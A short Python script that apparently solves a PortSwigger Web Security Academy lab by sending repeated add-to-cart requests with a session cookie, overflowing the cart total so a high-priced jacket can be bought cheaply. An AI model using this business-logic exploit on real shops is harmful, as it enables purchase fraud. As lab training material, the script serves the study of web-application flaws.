from tqdm import tqdm
import requests

url = 'https://acb01fb71e82b4eec0880e9e00b3009c.web-security-academy.net/cart'
cookies = {'session': 'JW3YM8sH2fNr1YHB3JGMsdfzzxsZhS0b'}

def send_request(product_id, quantity):
    data = {'productId': product_id, 'redir': 'PRODUCT', 'quantity': quantity}
    requests.post(url, data=data, cookies=cookies)

for _ in tqdm(range(324)):
    send_request(1, 99)

print('Ordering 47 more jackets')
send_request(1, 47)

to_buy = int(1221.96 // 28.31) + 1
print(f"Ordering {to_buy} other items")
send_request(2, to_buy)
